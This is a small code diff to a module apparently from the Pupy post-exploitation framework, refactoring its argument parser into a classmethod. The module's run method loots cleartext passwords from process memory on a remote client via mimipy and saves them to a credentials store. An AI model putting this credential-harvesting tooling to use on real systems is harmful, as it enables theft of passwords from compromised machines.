@@ -13,14 +13,15 @@ class MimipyMod(PupyModule):
     """
     dependencies=['memorpy', 'mimipy']
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='mimipy', description=self.__doc__)
-        self.arg_parser.add_argument('-v', '--verbose', default=False, action='store_true', help='be more verbose !')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='mimipy', description=cls.__doc__)
+        cls.arg_parser.add_argument('-v', '--verbose', default=False, action='store_true', help='be more verbose !')
 
     def run(self, args):
         found=False
         db = Credentials(client=self.client.short_name(), config=self.config)
-        
+
         for t, process, u, passwd in self.client.conn.modules['mimipy'].mimipy_loot_passwords(optimizations="nsrx", clean=False):
             cred={
                 'Password': passwd,
@@ -34,4 +35,3 @@ class MimipyMod(PupyModule):
             found=True
         if not found:
             self.success("no password found :/")
-
